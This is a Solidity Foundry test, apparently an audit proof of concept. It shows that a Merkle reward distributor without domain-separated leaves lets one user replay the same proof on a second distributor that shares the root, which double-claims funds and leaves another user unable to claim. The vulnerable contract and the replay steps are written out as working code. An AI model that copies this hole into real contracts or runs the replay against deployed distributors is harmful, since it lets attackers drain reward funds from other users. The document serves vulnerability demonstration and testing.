// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

import {Merkle} from "lib/murky/src/Merkle.sol";

import {MerkleProof} from "lib/openzeppelin-contracts/contracts/utils/cryptography/MerkleProof.sol";

// ---- Minimal OZ-style ERC20 mock ----
contract ERC20Mock {
    string public name = "Reward";
    string public symbol = "RWD";
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        emit Transfer(address(0), to, amt);
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        unchecked {
            balanceOf[msg.sender] -= amt;
            balanceOf[to] += amt;
        }
        emit Transfer(msg.sender, to, amt);
        return true;
    }
}

contract URDLike {
    bytes32 public root;

    mapping(address account => mapping(address reward => uint256 amount)) public claimed;

    event RootSet(bytes32 root);

    function setRoot(bytes32 r) external {
        root = r;
        emit RootSet(r);
    }

    function claim(address account, address reward, uint256 claimable, bytes32[] calldata proof)
        external
        returns (uint256 amount)
    {
        require(root != bytes32(0), "ROOT_NOT_SET");

        // same preimage as prod URD
        bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))));

        require(MerkleProof.verifyCalldata(proof, root, leaf), "INVALID_PROOF_OR_EXPIRED");

        // payout = claimable - claimed
        uint256 prev = claimed[account][reward];

        require(claimable > prev, "CLAIMABLE_TOO_LOW");

        amount = claimable - prev;

        claimed[account][reward] = claimable;

        // do the transfer
        (bool s,) = reward.call(abi.encodeWithSignature("transfer(address,uint256)", account, amount));
        require(s, "TRANSFER_FAIL");
    }
}

contract URD_DomainSeparation is Test {
    ERC20Mock reward;
    URDLike urdA;
    URDLike urdB;

    Merkle merkle;

    // BUG: domain-less leaves: mising chainId, salt, or URD-address
    function _leaf(address account, address token, uint256 claimable) internal pure returns (bytes32) {
        return keccak256(bytes.concat(keccak256(abi.encode(account, token, claimable))));
    }

    function setUp() public {
        reward = new ERC20Mock();
        urdA = new URDLike();
        urdB = new URDLike();

        merkle = new Merkle();

        // fund both URDs with the SAME reward token
        reward.mint(address(urdA), 1_000 ether);
        reward.mint(address(urdB), 100 ether);
    }

    function test_DoubleClaim_WithRealMerkleProofs() public {
        // Build a tree with three users for the same reward token
        address user1 = address(0xBEEF);
        address user2 = address(0xCAFE);
        address user3 = address(0xDEAD);
        uint256 claimable1 = 100 ether;
        uint256 claimable2 = 80 ether;
        uint256 claimable3 = 3 ether;

        bytes32[] memory leaves = new bytes32[](3);
        leaves[0] = _leaf(user1, address(reward), claimable1);
        leaves[1] = _leaf(user2, address(reward), claimable2);
        leaves[2] = _leaf(user3, address(reward), claimable3);

        bytes32 R = merkle.getRoot(leaves);
        bytes32[] memory proof1 = merkle.getProof(leaves, 0);
        bytes32[] memory proof2 = merkle.getProof(leaves, 1);

        // Set the SAME root on both URDs
        urdA.setRoot(R);
        urdB.setRoot(R); // mistake!

        // user1 claims on A
        vm.prank(user1);
        urdA.claim(user1, address(reward), claimable1, proof1);
        assertEq(reward.balanceOf(user1), claimable1);

        // user1 replays same inputs on B
        vm.prank(user1);
        urdB.claim(user1, address(reward), claimable1, proof1);
        assertEq(reward.balanceOf(user1), claimable1 * 2); // double-claimed

        // user2 now cannot claim on B
        vm.prank(user2);
        vm.expectRevert("TRANSFER_FAIL");
        urdB.claim(user2, address(reward), claimable2, proof2);
        console2.log("user2 balance", reward.balanceOf(user2));
        assertEq(reward.balanceOf(user2), 0);

        // fix the urdB root to remove user1
        bytes32[] memory leavesB = new bytes32[](2);
        leavesB[0] = _leaf(user2, address(reward), claimable2);
        leavesB[1] = _leaf(user3, address(reward), claimable3);

        bytes32[] memory proofB2 = merkle.getProof(leavesB, 0);

        urdB.setRoot(merkle.getRoot(leavesB));

        // user2 still cannot claim on B
        vm.prank(user2);
        vm.expectRevert("TRANSFER_FAIL");
        urdB.claim(user2, address(reward), claimable2, proofB2);
        console2.log("user2 balance", reward.balanceOf(user2));
        assertEq(reward.balanceOf(user2), 0);
    }
}
